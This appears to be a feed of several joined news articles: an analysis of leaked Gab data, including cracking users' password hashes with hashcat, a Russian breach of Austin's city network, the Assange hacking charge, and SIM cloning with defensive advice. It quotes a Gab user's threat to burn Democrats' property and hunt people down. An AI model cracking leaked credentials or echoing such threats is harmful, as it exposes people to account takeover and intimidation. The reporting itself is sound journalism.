<p>The chat logs are all contained in a single 9.5-megabyte text file. In addition to chat logs showing Torba <a href="https://www.motherjones.com/politics/2021/03/andrew-torba-anti-semites/">courting prominent anti-Semites</a> for his site, the text file includes more than 70,000 messages from over 15,000 users. For example, here’s a snippet of the chatter going on during the January 6 insurrection at the U.S. Capitol:</p>
<p>@666666: Just so you know, I’m going to terrorize and burn some Democrats places. Come bail me out</p>
<p>@666666: If you ever want info on someone, let me know. I [can] hunt anyone down. I’m using my skip tracing skills to “give back” to the democratic community. It’s only fair</p>
<h3>Gab by the Numbers</h3>
<!-- BLOCK(photo)[3](%7B%22componentName%22%3A%22PHOTO%22%2C%22entityType%22%3A%22RESOURCE%22%7D)(%7B%22scroll%22%3Afalse%2C%22align%22%3A%22bleed%22%2C%22bleed%22%3A%22large%22%2C%22width%22%3A%22auto%22%7D) --><div class="img-wrap align-bleed large-bleed width-auto" style="width: auto;"><!-- CONTENT(photo)[3] -->

<p>By January 6, the day that Donald Trump supporters tried to violently prevent Congress from certifying Joe Biden’s electoral victory, Gab had 1.6 million accounts. After the insurrection, Amazon’s cloud hosting business <a href="https://www.bloomberg.com/news/articles/2021-01-11/amazon-s-removal-of-parler-shows-cloud-unit-s-rarely-used-power">kicked</a> the extremist social network Parler off its platform, a decision that prompted a flood of exiled Parler users to flee to Gab. Between January 6 and February 19, an additional 2.4 million Gab accounts were created.</p>
<p>The vast majority of these over 4 million accounts aren’t actually active. Only 1.5 million of them have posted any content to the site at all, and only 400,000 of those have posted more than 10 times. Just over 100,000 accounts have posted more than 10 times since December 1, 2020, making that number much closer to Gab’s actual active user base.</p>

<p>The post-insurrection spike in Gab accounts also holds true for Gab groups. However, there’s also a spike in private groups that were created before the insurrection. The night of December 22, someone created 46 private groups for chapters of the Oath Keepers, a far-right anti-government militia that helped storm the Capitol weeks later, but the groups were either never used or their members deleted all of the posts in them and left the groups before Gab was hacked in late February.</p>

<p>Needless to say, his predictions did not come to pass.</p>
<h3>Cracking Gab Passwords</h3>
<p>Like most websites, instead of storing passwords itself, Gab scrambles the passwords using a “hash function” and stores the scrambled versions instead, called a “password hash.” For example, if someone used the password “Trump2020,” GabLeaks would only contain the scrambled version of that. The only way to confirm if that’s their password is to try running it through the same hash function Gab uses and see if any accounts are using that hash.</p>
<p>It turns out that at least three Gab users are using the password “Trump2020,” at least one is using “Trump2024,” and at least one is using “trump2024” (with a lowercase “t”). A few Gab users are using typical insecure passwords like “123456,” “asdf1234,” “letmein,” and “password1.” And at least one user is using an anti-Black racial slur as their password.</p>
<p>Armed with the 7,710 password hashes from GabLeaks, a list of nearly 9,000 password guesses that I created, and my gaming PC, which has a graphics processing unit, or GPU — hardware that can quickly do the math required for 3D graphics as well as things like cracking passwords — I used a tool called <a href="https://hashcat.net/wiki/">hashcat</a> to see which passwords were weak. It took about three days to crunch the numbers, and at the end I successfully cracked 88 passwords, 49 of which were unique.</p>
<p>Among the Gab accounts I found using incredibly weak passwords was an <a href="https://gab.com/OneManAuschwitz">account</a> with the username “OneManAuschwitz” that shares Nazi propaganda used a weak password, as did an <a href="https://gab.com/juan3">account</a> belonging to a “Proud White Man” that shares racist and anti-Semitic memes. Several accounts devoted to QAnon had weak passwords, and so did several accounts that share run-of-the-mill conspiracy theories about the Covid-19 vaccine and the 2020 election.</p>
<p>Thirty-one of the cracked passwords used the same extremely weak password, and nearly all of them used email addresses from the disposable email service sharklasers.com. These are all Gab “fan” accounts that repost tweets from popular extremist Twitter accounts. For example, the Candace Owens <a href="https://gab.com/RealCandaceO">fan account</a> has 10,200 followers on Gab, the Dinesh D’Souza <a href="https://gab.com/DineshDSouza">fan account</a> has 7,800 followers, and the Breitbart News <a href="https://gab.com/BreitbartNewsTweets">fan account</a> has 7,100 followers. None of these accounts have posted since November 2018 and are now <a href="https://steemit.com/gab/@user1397/leaving-gab">abandoned</a>.</p>
<p><strong>Correction: March 16, 2021</strong></p>
<p><em>A previous version of this article stated that one of the Gab accounts with weak passwords belonged to Spencer Brown, the spokesperson for the Young America&#8217;s Foundation, a conservative youth organization with alumni that include former Trump senior policy adviser Stephen Miller and former Attorney General Jeff Sessions. Brown did not respond to a request for comment prior to publication but an attorney for the Young America&#8217;s Foundation contacted The Intercept after publication and stated that the Gab account was not associated with Brown.</em></p>

                                        <content:encoded><![CDATA[<p><u>Gab, the far-right</u> social network that’s known as a safe space for hate speech, QAnon believers, Trump election fraud conspiracists, and <a href="https://www.businessinsider.com/pittsburgh-synagogue-shooting-gab-2018-10">white supremacist terrorists</a>, was <a href="https://www.wired.com/story/gab-hack-data-breach-ddosecrets/">hacked pretty badly</a>. The site exploded in popularity after the January 6 insurrection when Amazon <a href="https://www.buzzfeednews.com/article/johnpaczkowski/amazon-parler-aws">kicked</a> Parler, another social network used by right-wing extremists, offline, which caused Gab’s user base to explode from about 1 million users to roughly 4 million.</p>
<p>The hacker made off with the email addresses and encrypted passwords of all 4 million of the site’s users and the content of more than 39 million posts, including everything posted to 7,632 private groups, and leaked them to the radical transparency group Distributed Denial of Secrets. On Monday, DDoSecrets <a href="https://ddosecrets.substack.com/p/release-gableaks-70gb">released</a> the nearly 70 gigabytes of hacked data to journalists and researchers. Gab’s CEO Andrew Torba has <a href="https://ddosecrets.com/wiki/GabLeaks#False_Accusations_by_Gab">falsely accused</a> DDoSecrets of hacking Gab — a source provided DDoSecrets with the data, they didn’t hack it themselves — and then used an <a href="https://twitter.com/a_greenberg/status/1366208261897261061">anti-trans slur</a> when posting about the group.</p>

<p>Former President Donald Trump’s verified Gab account was among those that were compromised (though the account&#8217;s description says it&#8217;s &#8220;reserved&#8221; for Trump, and Torba <a href="https://www.businessinsider.com/trump-breaks-silence-with-post-on-gab-denouncing-impeachment-trial-2021-2">has stated</a> that Trump himself doesn&#8217;t use it). When I got my hands on the Gab data, the first thing I did was look up Trump’s account, and the first thing I noticed was the email address associated with it: salesjss@kuhcoon.com. Why was Trump using this obscure email address, and what is Kuhcoon?</p>
<p>It turns out that Torba, the current CEO of Gab, is the former CEO and founder of Kuhcoon (later renamed Automate Ads and acquired by AdHawk in 2017), a tech startup that offered automated Facebook ad campaigns. According to a <a href="https://www.youtube.com/watch?v=sx4tH0bWQzs">2015 interview</a>, Torba started Kuhcoon in 2011 with his college roommate. The company received venture capital backing from Y Combinator in 2014; in August 2016, Torba stepped down as CEO, and he, along with his co-worker Ekrem Büyükkaya, <a href="https://www.businessinsider.com/pittsburgh-synagogue-shooting-gab-2018-10#the-site-was-cofounded-by-andrew-torba-2">founded</a> Gab.</p>

<p>Since it launched, Gab has been a haven for far-right extremists. Torba’s Gab account was created on August 10, 2016, and the next account created later that day was for the &#8220;alt-right&#8221; personality Milo Yiannopoulos. Other extremists who created early accounts include anti-feminist conspiracist Mike Cernovich and prominent neo-Nazi Richard Spencer (best known for getting <a href="https://twitter.com/natefoo/status/822659271645167618">punched in the face</a> at Trump’s inauguration in 2017). The accounts on Gab that have the most followers on the whole platform include unhinged QAnon-sympathizing Republican Reps. Marjorie Taylor Greene and Lauren Boebert and personalities like Alex Jones. <a href="https://twitter.com/micahflee/status/1366843176867143680">Half</a> of the 20 most popular Gab groups are devoted to Trump and QAnon.</p>
<p>Trump’s account is the only one on Gab that uses an email address from kuhcoon.com. I sent an email to salesjss@kuhcoon.com, but the email bounced.</p>
<p>Torba didn’t reply to my email requesting his comment, but he did publicly tweet a response from Gab’s Twitter account, stating, “As per my policy of not communicating with non-Christian and/or communist journos, I will not be replying to this non-story,” and “It&#8217;s not a real email address, therefore it is not checked.”</p>

                                        <content:encoded><![CDATA[<p><u>State-sponsored hackers</u> believed to be from Russia have breached the city network of Austin, Texas, The Intercept has learned. The breach, which appears to date from at least mid-October, adds to the stunning array of intrusions attributed to Russia over the past few months.</p>
<p>The list of reported victims includes the departments of Commerce, Homeland Security, State, and the Treasury; the Pentagon; cybersecurity firm FireEye; IT software company SolarWinds; and assorted airports and local government networks across the United States, among others. The breach in Austin is another apparent victory for Russia’s hackers. By compromising the network of America’s 11th-most populous city, they could theoretically access sensitive information on policing, city governance, and elections, and, with additional effort, burrow inside water, energy, and airport networks. The hacking outfit believed to be behind the Austin breach, Berserk Bear, also appears to have used Austin’s network as infrastructure to stage additional attacks.</p>
<p>While the attacks on SolarWinds, FireEye, and U.S. government agencies have been linked to a second Russian group — APT29, also known as Cozy Bear — the Austin breach represents another battlefront in a high-stakes cyber standoff between the United States and Russia. Both Berserk Bear and Cozy Bear are known for quietly lurking in networks, often for months, while they spy on their targets. Berserk Bear — which is also known as Energetic Bear, Dragonfly, TEMP.Isotope, Crouching Yeti, and BROMINE, among other names — is believed to be responsible for a series of breaches of critical U.S. infrastructure over the past year.</p>
<!-- BLOCK(newsletter)[0](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[0] -->
<p>The Austin breach, which has not been previously reported, was revealed in documents prepared by the Microsoft Threat Intelligence Center, or MSTIC, and obtained by The Intercept, as well as in publicly available malware activity compiled by the site VirusTotal. “While we are aware of this hacking group, we cannot provide information about ongoing law enforcement investigations into criminal activity,” a spokesperson for the city of Austin wrote in response to a list of emailed questions.</p>
<p>On Sunday, Reuters <a href="https://in.reuters.com/article/usa-cyber-amazon-com-idINKBN28N0PV">reported</a> that a state-sponsored hacking group had breached the Treasury and Commerce departments, sparking an emergency weekend meeting of the National Security Council. The Washington Post later <a href="https://www.washingtonpost.com/national-security/russian-government-spies-are-behind-a-broad-hacking-campaign-that-has-breached-us-agencies-and-a-top-cyber-firm/2020/12/13/d5a53b88-3d7d-11eb-9453-fc36ba051781_story.html">attributed the attacks</a> to Cozy Bear, citing anonymous sources, and reported that the group breached the agencies by infecting a software update to Orion, a popular network management product made by SolarWinds, a firm based in Austin. “Fewer than 18,000” users downloaded the malicious software update, which has been available since March, SolarWinds said in a <a href="https://www.sec.gov/ix?doc=/Archives/edgar/data/1739942/000162828020017451/swi-20201214.htm">federal securities filing</a> on Monday. The Intercept has seen no evidence that the Austin breach and the SolarWinds hack are related.</p>
<p>Russia’s dramatic intrusions into U.S. networks come at an awkward moment for Washington. In November, President Donald Trump <a href="https://www.nytimes.com/2020/11/17/us/politics/trump-fires-christopher-krebs.html">fired</a> Christopher Krebs, the director of the Cybersecurity and Infrastructure Security Agency, or CISA, for refusing to go along with attempts to overturn the presidential election results, and Trump has generally shied away from criticizing Russian hacking operations.</p>
<p>Berserk Bear is suspected to be a unit of Russia’s Federal Security Service, or FSB. Cozy Bear, the group behind the attacks on federal government agencies, is affiliated with the Russian Foreign Intelligence Service, or SVR. Both the SVR and the FSB are considered successors to the Soviet-era KGB.</p>
<p>CISA and the FBI singled out Berserk Bear in an October 22 <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-296a">advisory</a> warning that the hacking group had targeted airports, energy companies, and state, local, and tribal governments around the country, and had “exfiltrated data from at least two victim servers.” The New York Times later <a href="https://www.nytimes.com/2020/10/28/us/politics/2020-election-hacking.html">reported</a> that FSB hackers had “bored into local networks” in California and Indiana, without specifying which networks had been breached.</p>
<p>It is now clear that a group of highly sophisticated hackers, likely Berserk Bear, also hit Austin. An IP address belonging to the city appears on a list of indicators of compromise, or technical evidence that organizations can use to determine if they&#8217;ve been hacked by this threat actor, compiled by MSTIC. When employees of the city of Austin visit websites from their work computers, this is the IP address that those websites see them coming from.</p>
<p>VirusTotal, a service owned by Google that allows the public to submit files to be analyzed and scanned by dozens of anti-virus programs, has cataloged 97 malware samples that were observed communicating with the Austin IP address, and 88 of them were submitted to the site since January. When malware runs on a computer, often the first thing it does is receive instructions from the hackers who control it. In these cases, the instructions appear to be coming from Austin’s compromised network.</p>
<p>The list of indicators of compromise accompanied an alert about Berserk Bear that MSTIC shared with public sector Microsoft customers in mid-November. That document warned that BROMINE, Microsoft’s name for Berserk Bear, had also targeted the telecommunications, aerospace, and defense sectors, hitting entities in the United Kingdom and Turkey as well as the United States.</p>
<p>Austin’s internet address was the only government IP on the MSTIC list. The other IPs belonged to cloud hosting providers like Amazon, DigitalOcean, Microsoft Azure, and the German company Hetzner, as well as Turkish cellular carrier Turkcell. The next day, MSTIC distributed a copy of the same alert without Austin’s IP address included. It’s possible that Microsoft initially included Austin’s IP address as an indicator of compromise by mistake, but the malware activity from VirusTotal makes that scenario unlikely. And VirusTotal cataloged six malware samples that communicated with this IP and were submitted in November and December, suggesting that Austin’s network remains compromised.</p>
<p>“It’s not surprising that hackers, when they find an unsecured server that is in the country that they’re targeting, use that as a jumping off point for lots of other things,” said John Scott-Railton, a senior researcher at Citizen Lab at the University of Toronto’s Munk School of Global Affairs and Public Policy, in an interview. “It makes things a lot easier.”</p>

<p>The Austin City Council appears to have been aware of the breach since October. CISA and FBI published an <a href="https://us-cert.cisa.gov/ncas/alerts/aa20-283a">initial advisory</a> on October 9 warning of “advanced persistent threat actors,” or APTs, targeting state and local governments, before publishing a follow-up advisory on October 22 in which the agencies attributed the campaign to Berserk Bear. Four days after the initial advisory, on October 13, the City Council went into a closed meeting to discuss “confidential network security information,” according to the <a href="https://www.austintexas.gov/edims/document.cfm?id=348419">posted agenda</a>. The council discussed the topic again two days later during an executive session of its regular meeting, according to <a href="https://www.austintexas.gov/edims/document.cfm?id=348460">that agenda</a>. The portions of the meetings in which the council discussed network security were closed to the public, and the agendas cited an exemption in the state’s rules governing open meetings related to “the vulnerability of a network to criminal activity.” An assistant to Mayor Steve Adler declined to comment, as did three other council members. “Any info council would have received on this would have been in executive session, and as such, any council member would not be able to comment,” a staffer for a fourth council member wrote in an email. The remaining six members did not respond to The Intercept’s questions.</p>
<p>On December 8, according to a <a href="https://austintx.new.swagit.com/videos/108106">transcript</a> of the City Council meeting, the city authorized a $2.4 million contract for cyber liability insurance — a product that typically covers losses from data breaches and hacks.</p>
<p>Berserk Bear’s campaign targeted hundreds of organizations across the United States in addition to the city of Austin. A <a href="https://indd.adobe.com/view/64463245-3411-49f9-b203-1c7cb8f16769">heat map</a> published by CISA, last updated on November 17, lists types of organizations that were compromised, scanned, or targeted with other reconnaissance activity from Berserk Bear’s hacking infrastructure. It includes 75 airports, four airlines, 13 cities, four counties, three states, and dozens of other targets in aviation, defense, information technology, health care, transportation, and other industries. CISA did not name any of the targets in the heat map.</p>
<p>Berserk Bear&#8217;s reputation for lurking fits a pattern that is common for espionage-related attacks, where “adversaries have already been sitting in the network for three months or so before someone realizes that they are there,” said Sami Ruohonen, a researcher with the Finnish cybersecurity firm F-Secure. “This is a technique that is specifically favored by these APT groups, just for the fact that the longer you go unnoticed, the longer you have a foothold in the network.” In a <a href="https://blog-assets.f-secure.com/wp-content/uploads/2019/04/15105531/F-Secure_energy_report.pdf">report</a> published last year, F-Secure compared Berserk Bear and similar groups to the IT equivalent of a sleeper agent.</p>
<p>Yet cybersecurity experts warned that while the Berserk Bear hackers are not known for sabotage, they could rear up at any moment and wreak havoc in the United States, for example, by making cities go dark. “We should be cognizant of the level of information that they have,” said Vikram Thakur, a technical director at Symantec who has <a href="https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/dragonfly-energy-sector-cyber-attacks">tracked the group</a> for years. “Turning on valves or closing valves, things of that sort — they have the expertise to do it.” In 2010, Stuxnet, a <a href="https://www.wired.com/2014/11/countdown-to-zero-day-stuxnet/">digital weapon</a> developed by the United States and Israel, temporarily took out as many as one-fifth of Iran’s centrifuges and <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2014/11/12/stuxnet/">infected systems</a> around the world; in 2015, the Russian hacking group Sandworm <a href="https://www.fireeye.com/blog/threat-research/2016/01/ukraine-and-sandworm-team.html">triggered</a> an extensive power blackout in Ukraine.</p>

<p>Like their <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2015/02/17/nsa-kaspersky-equation-group-malware/">counterparts</a> in the National Security Agency, the Berserk Bear hackers are highly skilled and often narrowly focused on their targets. In 2013, Symantec found that Berserk Bear hit targets throughout the United States and Europe by using so-called watering hole attacks, which involves identifying websites frequented by members of an organization and infecting the sites with malware. The Russian hackers separately compromised software that is used by a small group of businesses in the energy sector. “This was very specific software for people who work in the industrial space,” says Thakur. “They knew who their targets were.”</p>
<p>Berserk Bear’s breach of Austin’s network may have been extensive. CISA’s October 22 alert said that the hackers exploited a <a href="https://www.cyberscoop.com/cisa-netlogon-microsoft-vulnerability-emergency/">critical vulnerability</a> in Netlogon, Microsoft’s authentication protocol, allowing them access to valid usernames and passwords of all users of the network. In at least one instance, the alert said, they used those credentials to steal information, including documents, related to “sensitive network configurations and passwords” and “printing access badges.” And in at least one case, the hackers used valid credentials to compromise Microsoft Office 365 email accounts. While it is not clear from the CISA alert whether those two instances described Austin, full network access would have allowed the hackers to assume “the privileges of anyone in the network,” said Ruohonen, of F-Secure. “If you think about data that is only available to the CEO, or data that is only available to IT services, they would have all of this data.”</p>
<p>The breaches tracked by CISA and the FBI were so severe that the agencies recommended drastic measures. The only way an organization can be sure that it has removed the threat, they advised in the October 22 alert, is by systematically rebuilding the network from the ground up, noting that it’s “critical to perform a full password reset on all user and computer accounts,” an incredibly daunting and expensive task.</p>
<p>“The City follows the measures that the Cybersecurity and Infrastructure Security Agency (CISA) and the FBI recommend for local governments,” the Austin spokesperson said. But the city has apparently not reset all its accounts. One employee was asked to enable multifactor authentication on internal services, but they have not been asked to change any passwords or reset and reconfigure their computer.</p>
<p>Malware still appears to be communicating with Austin’s network. The most recent malware sample found on VirusTotal that was observed communicating with Austin’s IP address was submitted to the site for analysis on December 15, two days ago.</p>

                                        <content:encoded><![CDATA[<p><u>By 2013,</u> the Obama administration had <a href="https://www.washingtonpost.com/world/national-security/julian-assange-unlikely-to-face-us-charges-over-publishing-classified-documents/2013/11/25/dd27decc-55f1-11e3-8304-caf30787c0a9_story.html">concluded</a> that it could not charge WikiLeaks or Julian Assange with crimes related to publishing classified documents — documents that showed, among other things, evidence of U.S. war crimes in Iraq and Afghanistan — without criminalizing investigative journalism itself. President Barack Obama’s Justice Department called this the “New York Times problem,” because if WikiLeaks and Assange were criminals for publishing classified information, the New York Times would be just as guilty.</p>
<p>Five years later, in 2018, the Trump administration <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2019/04/11/the-u-s-governments-indictment-of-julian-assange-poses-grave-threats-to-press-freedoms/">indicted</a> Assange anyway. But, rather than charging him with espionage for publishing classified information, they charged him with conspiracy to commit a computer crime, later adding 17 counts of espionage in a superseding May 2019 indictment and expanding on those charges in another superseding <a href="https://www.justice.gov/opa/press-release/file/1289641/download">indictment</a> in June 2020.</p>
<!-- BLOCK(pullquote)[0](%7B%22componentName%22%3A%22PULLQUOTE%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22pull%22%3A%22right%22%7D) --><blockquote class="stylized pull-right" data-shortcode-type="pullquote" data-pull="right"><!-- CONTENT(pullquote)[0] -->The alleged hacking not only didn’t happen, according to expert testimony, but it also couldn’t have happened.<!-- END-CONTENT(pullquote)[0] --></blockquote><!-- END-BLOCK(pullquote)[0] -->
<p>The computer charges claimed that, in 2010, Assange conspired with his source, Chelsea Manning, to crack an account on a Windows computer in her military base, and that the “primary purpose of the conspiracy was to facilitate Manning’s acquisition and transmission of classified information.” The account enabled internet file transfers using a protocol known as <a href="https://en.wikipedia.org/wiki/File_Transfer_Protocol">FTP</a>.</p>
<p>New testimony from the third week of Assange’s extradition trial makes it increasingly clear that this hacking charge<a href="https://shadowproof.com/2020/09/26/password-cracking-conspiracy-theory-assange-extradition-tria/"> is incredibly flimsy</a>. The alleged hacking not only didn’t happen, according to expert testimony at Manning’s court martial hearing in 2013 and again at Assange’s extradition trial last week, but it also couldn’t have happened.</p>
<p>The new testimony, <a href="https://shadowproof.com/2020/09/26/password-cracking-conspiracy-theory-assange-extradition-tria/">reported</a> earlier this week by investigative news site Shadowproof, also shows that Manning already had authorized access to, and the ability to exfiltrate, all of the documents that she was accused of leaking — without receiving any technical help from WikiLeaks.</p>
<!-- BLOCK(newsletter)[1](%7B%22componentName%22%3A%22NEWSLETTER%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%7D) --><div class="shortcode" data-shortcode="newsletter" data-campaign="" data-cta="" data-headline="" data-layout="" data-subhead=""></div><!-- END-BLOCK(newsletter)[1] -->
<p><u>The government’s</u> hacking case appears to be rooted entirely in a few offhand remarks in what it says are chat logs between Manning and Assange discussing password cracking — a topic that other soldiers at Forward Operating Base Hammer in Iraq, where Manning was stationed, were also actively interested in.</p>
<p>The indictment claims that around March 8, 2010, after Manning had already downloaded everything she leaked to WikiLeaks other than the State Department cables, the whistleblower provided Assange with part of a “password hash” for the FTP account and Assange agreed to try to help crack it. A password hash is effectively an encrypted representation of a password from which, in some cases, it’s possible to recover the original.</p>
<p>Manning already had authorized access to all of the documents she was planning to leak to WikiLeaks, including the State Department cables, and cracking this password would not have given her any more access or otherwise helped her with her whistleblowing activities. At most, it might have helped her hide her tracks, but even that is not very likely. I suspect she was just interested in password cracking.</p>
<p>Assange, however, never cracked the password.</p>
<p>That’s it. That’s what the government’s entire computer crime conspiracy case against Assange is based on: a brief discussion about cracking a password, which never actually happened, between a publisher and his source.</p>
<!-- BLOCK(promote-related-post)[2](%7B%22componentName%22%3A%22PROMOTE_RELATED_POST%22%2C%22entityType%22%3A%22SHORTCODE%22%2C%22optional%22%3Atrue%7D)(%7B%22relatedPostNumber%22%3A4%7D) --><div class="promote-embed" data-related-post-number="4"></div><!-- END-BLOCK(promote-related-post)[2] -->
<p>The government has, at various points, provided other, dubious evidence that Assange engaged in a hacking conspiracy with Manning. In the 2019 indictment, for example, it suggested that Assange induced Manning to commit computer crimes by encouraging her to provide further information to WikiLeaks — when in fact such back and forth between journalists and their sources is routine.</p>
<p>In the 2020 indictment, attempting to portray Assange as a hacker rather than a journalist, the government listed other instances of Assange allegedly directing hacking activity by people other than Manning — but did not add to the charges against him, prompting a discussion of whether the statute of limitations on the alleged new crimes had expired. Assange’s lawyers <a href="https://www.computerweekly.com/news/252488691/Court-rejects-request-to-exclude-11th-hour-US-evidence-against-WikiLeaks-founder-Julian-Assange">called</a> the newest evidence “‘make weight’ allegations designed to bring all of this back within the limitation period.” It remains to be seen if the U.S. government will pursue this reaching strategy. At the moment it seems that these supplemental allegations are peripheral to the first, and only clearly chargeable, instance described by the government that could be conceived as a conspiracy to commit a computer crime — providing marginal support for a case which is, at its core, already weak.</p>
<p>Therefore, the charge is not actually about hacking — it’s about establishing legal precedent to <a href="https://www.amnesty.org/en/latest/news/2020/09/julian-assange-extradition-hearing-punishing-the-publisher/">charge publishers</a> with conspiring with their sources, something that so far the U.S. government has failed to do because of the First Amendment.</p>
<p>As Shadowproof points out: In June 2013, at Manning’s court martial hearing, David Shaver, a special agent for the Army Computer Crimes Investigating Unit, <a href="https://archive.org/stream/usa-v-manning-third-party-transcripts/06-12-13-PM-session#page/n19/mode/2up/search/hash">testified</a> that Manning only provided Assange with part of the password hash and that, with only that part, it’s not possible to recover the original password. It would be like trying to make a cappuccino without any espresso; Assange was missing a key ingredient.</p>
<p><u>Last week</u> at Assange’s extradition trial, Patrick Eller, a former Command Digital Forensics Examiner at the U.S. Army Criminal Investigation Command, further discredited the computer crime conspiracy charge, according to Shadowproof.</p>
<p>Eller confirmed Shaver’s 2013 testimony that Manning didn’t provide Assange with enough information to crack the password. He pointed out, “The only set of documents named in the indictment that Manning sent after the alleged password cracking attempt were the State Department cables,” and that “Manning had authorized access to these documents.”</p>
<p>Eller also said that other soldiers at Manning’s Army base in Iraq were regularly trying to crack administrator passwords on military computers in order to install programs that they weren’t authorized to install. “While she” — Manning — “was discussing rainbow tables and password hashes in the Jabber chat” — with Assange — “she was also discussing the same topics with her colleagues. This, and the other factors previously highlighted, may indicate that the hash cracking topic was unrelated to leaking documents.”</p>

<p>I’m not a fan of Julian Assange, particularly since his unethical actions and <a href="https://micahflee.com/2019/01/lies-that-wikileaks-tells-you/">lies he’s told</a> since the 2016 U.S. election. But I am a <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2019/08/04/whistleblowers-surveillance-fbi-trump/">proponent</a> of a strong free press, and his case is <a href="https://freedom.press/news/the-most-dangerous-press-freedom-issue-of-2020-is-trumps-prosecution-of-julian-assange/">critically important</a> for the future of journalism in this country.</p>
<p>Journalists have relationships with their sources. These relationships are not criminal conspiracies. Even if a source ends up breaking a law by providing the journalist with classified information, the journalist did not commit a felony by receiving it and publishing it.</p>
<p>Whether or not you believe Assange is a journalist is beside the point. The New York Times just published <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/09/28/donald-trump-taxes/">groundbreaking revelations</a> from two decades of Donald Trump’s taxes showing obscene tax avoidance, massive fraud, and hundreds of millions of dollars of debt.</p>
<p>Trump would like nothing more than to charge the New York Times itself, and individual journalists that reported that story, with felonies for conspiring with their source. This is why the precedent in Assange’s case is so important: If Assange loses, the Justice Department will have established new legal tactics with which to go after publishers for conspiring with their sources.</p>
<p><strong>Update: October 23, 2020</strong></p>
<p>This story has been updated to address other allegations made by the government against Assange, including in a June 2020 superseding indictment.</p>

                                        <content:encoded><![CDATA[<p><u>Federal agents</u> from the Department of Homeland Security and the Justice Department used “a sophisticated cell phone cloning attack—the details of which remain classified—to intercept protesters’ phone communications” in Portland this summer, Ken Klippenstein<a href="https://www.thenation.com/article/politics/homeland-security-portland/"> reported this week in The Nation</a>. Put aside for the moment that, if the report is true, federal agents conducted sophisticated electronic surveillance against American protesters, an alarming breach of constitutional rights. Do ordinary people have any hope of defending their privacy and freedom of assembly against threats like this?</p>
<p>Yes, they do. Here are two simple things you can do to help mitigate this type of threat:</p>
<ul>
<li>As much as possible, and especially in the context of activism, use an encrypted messaging app like <a href="https://signal.org/">Signal</a> — and get everyone you work with to use it too — to protect your SMS text messages, texting groups, and voice and video calls.</li>
<li>Prevent other people from using your SIM card by setting a SIM PIN on your phone. There are instructions on how to do this below.</li>
</ul>
<h3>How SIM Cloning Works</h3>
<p>Without more details, it’s hard to be entirely sure what type of surveillance was used, but The Nation’s mention of “cell phone cloning” makes me think it was a SIM cloning attack. This involves duplicating a small chip used by virtually every cellphone to link itself to its owner’s phone number and account; this small chip is the subscriber identity module, more commonly known as SIM.</p>
<p>Here’s how SIM cloning would work:</p>
<ul>
<li>First, the feds would need physical access to their target’s phone; for example, they could arrest their target at a protest, temporarily confiscating their phone.</li>
<li>Then they would pop out the SIM card from the phone, a process designed to be easy, since end users often have reasons to replace the card (such as traveling abroad and needing a local SIM card to access the local cellular network, or when switching cellular providers).</li>
<li>The feds would then copy their target’s SIM card data onto a blank SIM card (this presents some challenges, as I explain below), and then put the original SIM card back without their target knowing.</li>
</ul>
<p>SIM cards contain a secret encryption key that is used to encrypt data between the phone and cellphone towers. They&#8217;re designed so that this key can be used (like when you receive a text or call someone) but so the key itself can&#8217;t be extracted.</p>
<p>But it&#8217;s still possible to extract the key from the SIM card, by cracking it. Older SIM cards used a weaker encryption algorithm and could be <a href="https://www.unlockboot.com/clone-sim-card/">cracked quickly and easily</a>, but newer SIM cards use stronger encryption and might take days or significantly longer to crack. It&#8217;s possible that this is why the details of the type of surveillance used in Portland &#8220;remain classified.&#8221; Do federal agencies know of a way to quickly extract encryption keys from SIM cards? (On the other hand, it&#8217;s also possible that &#8220;cell phone cloning&#8221; doesn&#8217;t describe SIM cloning at all but something else instead, like <a href="https://www.zdnet.com/article/israeli-firm-cellebrite-grab-phone-data-seconds/">extracting files from the phone itself</a> instead of data from the SIM card.)</p>

<p>Assuming the feds were able to extract the encryption key from their target&#8217;s SIM card, they could give the phone back to their target and then spy on all their target&#8217;s SMS text messages and voice calls going forward. To do this, they would have to be physically close to their target, monitoring the radio waves for traffic between their target&#8217;s phone and a cell tower. When they see it, they can decrypt this traffic using the key they stole from the SIM card. This would also fit with what the anonymous former intelligence officials told The Nation; they said the surveillance was part of a &#8220;Low Level Voice Intercept&#8221; operation, a military term describing audio surveillance by monitoring radio waves.</p>
<p>If you were arrested in Portland and you&#8217;re worried that federal agents may have cloned your SIM card while you were in custody, it would be prudent to get a new SIM card.</p>
<h3>Temporarily Taking Over a Phone Number</h3>
<p>Even if law enforcement agencies don&#8217;t clone a target&#8217;s SIM card, they could gather quite a bit of information after temporarily confiscating the target&#8217;s phone.</p>
<p>They could power off the phone, pop out the SIM card, put it in a separate phone, and then power that phone on. If someone sends the target an SMS message (or texts a group that the target is in), the feds’ phone would receive that message instead of the target’s phone. And if someone called the target’s phone number, the feds’ phone would ring instead. They could also hack their target’s online accounts, so long as those accounts support resetting the password using a phone number.</p>
<p>But, in order to remain stealthy, they would need to power off their phone, put the SIM card back in their target&#8217;s phone, and power that phone on again before before returning it, which would restore the original phone&#8217;s access to the target&#8217;s phone number, and the feds would lose access.</p>
<h3>Abandon SMS and Switch to Encrypted Messaging Apps</h3>
<p>The simplest and best way to protect against SIM cloning attacks, as well as eavesdropping by stingrays, controversial phone surveillance devices that law enforcement has a history of <a href="https://27m3p2uv7igmj6kvd4ql3cct5h3sdwrsajovkkndeufumzyfhlfev4qd.onion/2020/07/31/protests-surveillance-stingrays-dirtboxes-phone-tracking/">using against protesters,</a> is to stop using SMS and normal phone calls as much as possible. These are not and have never been secure.</p>
